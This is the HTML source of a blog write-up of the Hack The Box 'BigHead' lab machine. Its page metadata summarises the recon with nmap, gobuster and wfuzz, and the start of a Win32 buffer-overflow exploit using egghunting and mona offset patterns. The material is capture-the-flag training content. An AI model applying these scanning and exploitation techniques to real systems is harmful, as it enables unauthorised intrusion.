<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - BigHead | 0xRick Owned Root !</title>
<meta name="generator" content="Jekyll v3.7.4" />
<meta property="og:title" content="Hack The Box - BigHead" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Quick Summary Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of Silicon Valley references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is 10.10.10.112. I added it to /etc/hosts as bighead.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC bighead.htb Only one port is open which is port 80 and it’s running http. Let’s take a look. HTTP Enumeration It’s a website titled PiperNet Comes. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying PIPERNET IS HERE. Also there are two links down there, First one is THIS IS PIPERNET which is the homepage and the other one is PIEDPIPERCOIN. Let’s scroll down and see what else do we have : PIEDPIPERCOIN COMES, and there’s a small description of what piedpipercoin is. After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form : I looked at the contact info and I noticed that the email was info@bachmanity.htb. Let’s check that domain, but before doing that I wanted to check the other page PIEDPIPERCOIN : Instead of PIEDPIPERCOIN COMES it’s saying PIEDPIPERCOIN CAME but nothing is interesting. Let’s check bachmanity.htb, we need to add it to /etc/hosts first : bachmanity.htb It’s only that image and nothing else : Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with test : It sends the request to mailer.bighead.htb, Let’s add it to /etc/hosts and try again : It shows this message then it redirects the browser back to bighead.htb. I also intercepted the request with burp : Tried to manipulate the input, but couldn’t achieve anything. I went to mailer.bighead.htb and got redirected to mailer.bighead.htb/testlink which shows this error : In the background I ran gobuster on bachmanity.htb and bighead.htb with /usr/share/wordlists/dirb/common.txt. bachmanity.htb didn’t have anything : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bachmanity.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:21:01 Starting gobuster ===================================================== /index.html (Status: 200) /index.htm (Status: 200) but bighead.htb gave some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:16:23 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /assets (Status: 301) /backend (Status: 302) /Images (Status: 301) /images (Status: 301) /index.html (Status: 200) I went to /assets and it was forbidden : /backend redirected the browser to bighead.htb/BigHead which gave the same error we saw before : I clicked on error log and it gave the same error : Let’s check if there are any other subdomains. I used wfuzz with subdomains-top1mil-5000.txt from seclists: wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 non-valid subdomain responses are 11232 chars so we will remove those from the output : wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 We got 3 subdomains : dev, mailer and code. We already know about mailer, let’s add dev and code : code.bighead.htb redirected the browser to 127.0.0.1:5080/testlink/login.php So to see what’s on code.bighead.htb we will probably need to forward an internal service to our box. We can’t do that now so we will ignore code.bighead.htb for now. dev.bighead.htb shows this image of bighead : Source has nothing interesting : I ran gobuster again and got some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://dev.bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:55:05 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /blog (Status: 302) /blog_ajax (Status: 302) /blog_inlinemod (Status: 302) /blog_usercp (Status: 302) /blog_search (Status: 302) /blog_report (Status: 302) /blogger (Status: 302) /blogindex (Status: 302) /bloggers (Status: 302) /blogs (Status: 302) /blogspot (Status: 302) /wp-content (Status: 302) But all these pages gave this result : I intercepted the request in burp to figure out why : The response is 302, by following the redirect : It responds with another 302 So it will keep redirecting us in a loop and we won’t get anything. At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with wfuzz instead of gobuster and I got one more result : wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ The reason why gobuster didn’t show us this page is because of the status code. gobuster only showed results with these status codes : [+] Status codes : 200,204,301,302,307,403, While wfuzz showed everything except 404 responses, --hc 404. /coffee gave a response of 418 which is weird. I looked it up and found some info about it here. 418 I&#39;m a teapot ! Anyway let’s take a look : http://dev.bighead.htb/coffee It’s showing this gif : Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?! I intercepted the request with burp and looked at the response : I noticed a weird server name : BigheadWebSvr 1.0. I looked it up and found a repository on the machine creator’s github (3mrgnc3) : I searched through the commits and got this one which seemed to be the right one. It asked for a password : I tried to guess it and after some attempts bighead worked : Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow. Buffer Overflow in BigheadWebSvr I tried to run the server but it complained about some missing dll called libmingwex-0.dll : So I installed mingw and copied the dll to the same directory as the server : Then I had to allow access for it : Now the server is running : But not on port 80 : I did netstat -a -b and found that it’s running on port 8008 : Great, I intercepted the request with burp then I ran the server again with Immunity Debugger : Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example R1ck that egg is doubled and added before the shellcode like this : R1ckR1ck + shellcode. It’s explained very well in skape’s paper Safely Searching Process Virtual Address Space. There are also many practical tutorials just search for win32 egghunting. Now back to the vulnerable server, first thing we need to know is the offset. I’m using mona plugin. Documentation !mona config -set workingfolder c:\logs\%p, to make mona output to C:\logs To find the offset we will create a pattern !mona pc 100 (creates a pattern of 100 chars), this is the same as pattern_create.rb from metasploit. I used it in my buffer overflow write-ups. It will put the output in a file called pattern.txt in C:\logs : Pattern : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Full output : ``` ================================================================================ Output generated by mona.py v2.0, rev 585 - Immunity Debugger Corelan Team - https://www.corelan.be ================================================================================ Process being debugged : BigheadWebSvr (pid 1300) Current mona arguments: pc 100 ================================================================================ 2019-04-24 22:43:44 ================================================================================" />
<meta property="og:description" content="Quick Summary Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of Silicon Valley references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is 10.10.10.112. I added it to /etc/hosts as bighead.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC bighead.htb Only one port is open which is port 80 and it’s running http. Let’s take a look. HTTP Enumeration It’s a website titled PiperNet Comes. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying PIPERNET IS HERE. Also there are two links down there, First one is THIS IS PIPERNET which is the homepage and the other one is PIEDPIPERCOIN. Let’s scroll down and see what else do we have : PIEDPIPERCOIN COMES, and there’s a small description of what piedpipercoin is. After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form : I looked at the contact info and I noticed that the email was info@bachmanity.htb. Let’s check that domain, but before doing that I wanted to check the other page PIEDPIPERCOIN : Instead of PIEDPIPERCOIN COMES it’s saying PIEDPIPERCOIN CAME but nothing is interesting. Let’s check bachmanity.htb, we need to add it to /etc/hosts first : bachmanity.htb It’s only that image and nothing else : Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with test : It sends the request to mailer.bighead.htb, Let’s add it to /etc/hosts and try again : It shows this message then it redirects the browser back to bighead.htb. I also intercepted the request with burp : Tried to manipulate the input, but couldn’t achieve anything. I went to mailer.bighead.htb and got redirected to mailer.bighead.htb/testlink which shows this error : In the background I ran gobuster on bachmanity.htb and bighead.htb with /usr/share/wordlists/dirb/common.txt. bachmanity.htb didn’t have anything : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bachmanity.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:21:01 Starting gobuster ===================================================== /index.html (Status: 200) /index.htm (Status: 200) but bighead.htb gave some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:16:23 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /assets (Status: 301) /backend (Status: 302) /Images (Status: 301) /images (Status: 301) /index.html (Status: 200) I went to /assets and it was forbidden : /backend redirected the browser to bighead.htb/BigHead which gave the same error we saw before : I clicked on error log and it gave the same error : Let’s check if there are any other subdomains. I used wfuzz with subdomains-top1mil-5000.txt from seclists: wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 non-valid subdomain responses are 11232 chars so we will remove those from the output : wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 We got 3 subdomains : dev, mailer and code. We already know about mailer, let’s add dev and code : code.bighead.htb redirected the browser to 127.0.0.1:5080/testlink/login.php So to see what’s on code.bighead.htb we will probably need to forward an internal service to our box. We can’t do that now so we will ignore code.bighead.htb for now. dev.bighead.htb shows this image of bighead : Source has nothing interesting : I ran gobuster again and got some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://dev.bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:55:05 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /blog (Status: 302) /blog_ajax (Status: 302) /blog_inlinemod (Status: 302) /blog_usercp (Status: 302) /blog_search (Status: 302) /blog_report (Status: 302) /blogger (Status: 302) /blogindex (Status: 302) /bloggers (Status: 302) /blogs (Status: 302) /blogspot (Status: 302) /wp-content (Status: 302) But all these pages gave this result : I intercepted the request in burp to figure out why : The response is 302, by following the redirect : It responds with another 302 So it will keep redirecting us in a loop and we won’t get anything. At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with wfuzz instead of gobuster and I got one more result : wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ The reason why gobuster didn’t show us this page is because of the status code. gobuster only showed results with these status codes : [+] Status codes : 200,204,301,302,307,403, While wfuzz showed everything except 404 responses, --hc 404. /coffee gave a response of 418 which is weird. I looked it up and found some info about it here. 418 I&#39;m a teapot ! Anyway let’s take a look : http://dev.bighead.htb/coffee It’s showing this gif : Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?! I intercepted the request with burp and looked at the response : I noticed a weird server name : BigheadWebSvr 1.0. I looked it up and found a repository on the machine creator’s github (3mrgnc3) : I searched through the commits and got this one which seemed to be the right one. It asked for a password : I tried to guess it and after some attempts bighead worked : Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow. Buffer Overflow in BigheadWebSvr I tried to run the server but it complained about some missing dll called libmingwex-0.dll : So I installed mingw and copied the dll to the same directory as the server : Then I had to allow access for it : Now the server is running : But not on port 80 : I did netstat -a -b and found that it’s running on port 8008 : Great, I intercepted the request with burp then I ran the server again with Immunity Debugger : Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example R1ck that egg is doubled and added before the shellcode like this : R1ckR1ck + shellcode. It’s explained very well in skape’s paper Safely Searching Process Virtual Address Space. There are also many practical tutorials just search for win32 egghunting. Now back to the vulnerable server, first thing we need to know is the offset. I’m using mona plugin. Documentation !mona config -set workingfolder c:\logs\%p, to make mona output to C:\logs To find the offset we will create a pattern !mona pc 100 (creates a pattern of 100 chars), this is the same as pattern_create.rb from metasploit. I used it in my buffer overflow write-ups. It will put the output in a file called pattern.txt in C:\logs : Pattern : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Full output : ``` ================================================================================ Output generated by mona.py v2.0, rev 585 - Immunity Debugger Corelan Team - https://www.corelan.be ================================================================================ Process being debugged : BigheadWebSvr (pid 1300) Current mona arguments: pc 100 ================================================================================ 2019-04-24 22:43:44 ================================================================================" />
<link rel="canonical" href="http://localhost:4000/hack-the-box/bighead/" />
<meta property="og:url" content="http://localhost:4000/hack-the-box/bighead/" />
<meta property="og:site_name" content="0xRick Owned Root !" />
<meta property="og:image" content="http://localhost:4000/hackthebox/bighead/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-05-04T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"Quick Summary Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of Silicon Valley references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is 10.10.10.112. I added it to /etc/hosts as bighead.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC bighead.htb Only one port is open which is port 80 and it’s running http. Let’s take a look. HTTP Enumeration It’s a website titled PiperNet Comes. The background is an image of the characters from the TV show “Silicon Valley”, and in the middle it’s saying PIPERNET IS HERE. Also there are two links down there, First one is THIS IS PIPERNET which is the homepage and the other one is PIEDPIPERCOIN. Let’s scroll down and see what else do we have : PIEDPIPERCOIN COMES, and there’s a small description of what piedpipercoin is. After that there are some pictures for the characters from “Silicon Valley” and some stuff about each one of them, Nothing is interesting so far. At the bottom of the page there is this contact form : I looked at the contact info and I noticed that the email was info@bachmanity.htb. Let’s check that domain, but before doing that I wanted to check the other page PIEDPIPERCOIN : Instead of PIEDPIPERCOIN COMES it’s saying PIEDPIPERCOIN CAME but nothing is interesting. Let’s check bachmanity.htb, we need to add it to /etc/hosts first : bachmanity.htb It’s only that image and nothing else : Back to the contact form, I wanted to see if it’s exploitable in any way. I filled all the fields with test : It sends the request to mailer.bighead.htb, Let’s add it to /etc/hosts and try again : It shows this message then it redirects the browser back to bighead.htb. I also intercepted the request with burp : Tried to manipulate the input, but couldn’t achieve anything. I went to mailer.bighead.htb and got redirected to mailer.bighead.htb/testlink which shows this error : In the background I ran gobuster on bachmanity.htb and bighead.htb with /usr/share/wordlists/dirb/common.txt. bachmanity.htb didn’t have anything : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bachmanity.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:21:01 Starting gobuster ===================================================== /index.html (Status: 200) /index.htm (Status: 200) but bighead.htb gave some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:16:23 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /assets (Status: 301) /backend (Status: 302) /Images (Status: 301) /images (Status: 301) /index.html (Status: 200) I went to /assets and it was forbidden : /backend redirected the browser to bighead.htb/BigHead which gave the same error we saw before : I clicked on error log and it gave the same error : Let’s check if there are any other subdomains. I used wfuzz with subdomains-top1mil-5000.txt from seclists: wfuzz -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 non-valid subdomain responses are 11232 chars so we will remove those from the output : wfuzz -c --hh 11232 -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.bighead.htb&quot; http://10.10.10.112 We got 3 subdomains : dev, mailer and code. We already know about mailer, let’s add dev and code : code.bighead.htb redirected the browser to 127.0.0.1:5080/testlink/login.php So to see what’s on code.bighead.htb we will probably need to forward an internal service to our box. We can’t do that now so we will ignore code.bighead.htb for now. dev.bighead.htb shows this image of bighead : Source has nothing interesting : I ran gobuster again and got some results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://dev.bighead.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/24 20:55:05 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /blog (Status: 302) /blog_ajax (Status: 302) /blog_inlinemod (Status: 302) /blog_usercp (Status: 302) /blog_search (Status: 302) /blog_report (Status: 302) /blogger (Status: 302) /blogindex (Status: 302) /bloggers (Status: 302) /blogs (Status: 302) /blogspot (Status: 302) /wp-content (Status: 302) But all these pages gave this result : I intercepted the request in burp to figure out why : The response is 302, by following the redirect : It responds with another 302 So it will keep redirecting us in a loop and we won’t get anything. At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with wfuzz instead of gobuster and I got one more result : wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ The reason why gobuster didn’t show us this page is because of the status code. gobuster only showed results with these status codes : [+] Status codes : 200,204,301,302,307,403, While wfuzz showed everything except 404 responses, --hc 404. /coffee gave a response of 418 which is weird. I looked it up and found some info about it here. 418 I&#39;m a teapot ! Anyway let’s take a look : http://dev.bighead.htb/coffee It’s showing this gif : Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?! I intercepted the request with burp and looked at the response : I noticed a weird server name : BigheadWebSvr 1.0. I looked it up and found a repository on the machine creator’s github (3mrgnc3) : I searched through the commits and got this one which seemed to be the right one. It asked for a password : I tried to guess it and after some attempts bighead worked : Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow. Buffer Overflow in BigheadWebSvr I tried to run the server but it complained about some missing dll called libmingwex-0.dll : So I installed mingw and copied the dll to the same directory as the server : Then I had to allow access for it : Now the server is running : But not on port 80 : I did netstat -a -b and found that it’s running on port 8008 : Great, I intercepted the request with burp then I ran the server again with Immunity Debugger : Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example R1ck that egg is doubled and added before the shellcode like this : R1ckR1ck + shellcode. It’s explained very well in skape’s paper Safely Searching Process Virtual Address Space. There are also many practical tutorials just search for win32 egghunting. Now back to the vulnerable server, first thing we need to know is the offset. I’m using mona plugin. Documentation !mona config -set workingfolder c:\\logs\\%p, to make mona output to C:\\logs To find the offset we will create a pattern !mona pc 100 (creates a pattern of 100 chars), this is the same as pattern_create.rb from metasploit. I used it in my buffer overflow write-ups. It will put the output in a file called pattern.txt in C:\\logs : Pattern : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A Full output : ``` ================================================================================ Output generated by mona.py v2.0, rev 585 - Immunity Debugger Corelan Team - https://www.corelan.be ================================================================================ Process being debugged : BigheadWebSvr (pid 1300) Current mona arguments: pc 100 ================================================================================ 2019-04-24 22:43:44 ================================================================================","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/bighead/","image":"http://localhost:4000/hackthebox/bighead/0.png","headline":"Hack The Box - BigHead","dateModified":"2019-05-04T00:00:00+02:00","datePublished":"2019-05-04T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/bighead/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/tagbuttons.css">
  <link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - BigHead</h1>
    <p class="post-meta">
      <h7>
        Tags: 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Windows/';">Windows</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Web/';">Web</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Reverse Engineering/';">Reverse Engineering</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/egghunting/';">egghunting</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Buffer Overflow/';">Buffer Overflow</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Windows Exploitation/';">Windows Exploitation</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Exploit Development/';">Exploit Development</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/LFI/';">LFI</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/RCE/';">RCE</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Forensics/';">Forensics</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Networking/';">Networking</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Pivoting/';">Pivoting</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/ssh/';">ssh</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/code analysis/';">code analysis</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Python/';">Python</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/php/';">php</button> 
        
      </h7>
      <br>
      <time class="dt-published" datetime="2019-05-04T00:00:00+02:00" itemprop="datePublished">May 4, 2019
      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
</p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <hr />

<h3 id="quick-summary">Quick Summary</h3>
<h4 id="hey-guys-today-bighead-retired-and-heres-my-write-up-about-it-as-you-can-see-its-an-insane-box-actually-its-hard-to-summarize-this-box-as-it-included-a-lot-of-steps-to-achieve-different-goals-most-of-the-steps-require-deep-enumeration-especially-the-initial-foothold-the-part-i-liked-the-most-about-this-box-is-the-win32-buffer-overflow-egghunting-exploitation-as-it-was-very-interesting-the-whole-box-was-challenging-and-the-overall-experience-wasnt-bad-but-i-disliked-the-fact-that-it-had-a-lot-of-trolls-i-found-it-kinda-funny-that-the-box-had-a-lot-of-silicon-valley-references-d-even-the-name-of-the-box-is-the-name-of-one-of-the-characters-anyway-lets-not-waste-more-time-its-a-windows-box-and-its-ip-is-101010112-i-added-it-to-etchosts-as-bigheadhtb-lets-jump-right-in-">Hey guys, Today BigHead retired and here’s my write-up about it. As you can see it’s an insane box, actually it’s hard to summarize this box as it included a lot of steps to achieve different goals. Most of the steps require deep enumeration especially the initial foothold. The part I liked the most about this box is the win32 buffer overflow egghunting exploitation as it was very interesting. The whole box was challenging and the overall experience wasn’t bad, But I disliked the fact that it had a lot of trolls. I found it kinda funny that the box had a lot of <a href="https://www.imdb.com/title/tt2575988/">Silicon Valley</a> references :D even the name of the box is the name of one of the characters, Anyway let’s not waste more time. It’s a windows box and its ip is <code class="highlighter-rouge">10.10.10.112</code>. I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">bighead.htb</code>. Let’s jump right in !</h4>
<p><img src="/images/hackthebox/bighead/0.png" alt="" /></p>
<hr />

<h3 id="nmap">Nmap</h3>
<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with nmap to scan for open ports and services :</h4>
<p><code class="highlighter-rouge">nmap -sV -sT -sC bighead.htb</code>
<img src="/images/hackthebox/bighead/1.png" alt="" /></p>
<h4 id="only-one-port-is-open-which-is-port-80-and-its-running-http-lets-take-a-look">Only one port is open which is port 80 and it’s running http. Let’s take a look.</h4>
<p><br /></p>
<hr />

<h3 id="http-enumeration">HTTP Enumeration</h3>
<p><img src="/images/hackthebox/bighead/2.png" alt="" /></p>
